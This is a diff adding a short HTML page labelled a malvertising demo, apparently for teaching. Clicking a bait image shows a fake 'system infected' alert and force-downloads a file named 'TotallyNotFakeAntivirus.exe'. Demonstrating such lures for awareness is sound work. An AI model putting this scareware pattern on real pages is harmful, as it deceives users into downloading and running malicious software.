@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Malvertising</title>
+</head>
+
+<body>
+    <h1>Malvertising Demo</h1>
+
+    <img src="../images/hot_singles.png" onclick="display()">
+</body>
+
+<script>
+    function display() {
+        alert("YOUR SYSTEM IS INFECTED, DOWNLOAD AND RUN THIS ANTIVIRUS SOFTWARE TO REMOVE THE VIRUSES!")
+        var file_path = './TotallyNotFakeAntivirus.exe';
+        var a = document.createElement('A');
+        a.href = file_path;
+        a.download = file_path.substr(file_path.lastIndexOf('/') + 1);
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+    }
+</script>
+
+
+</html>
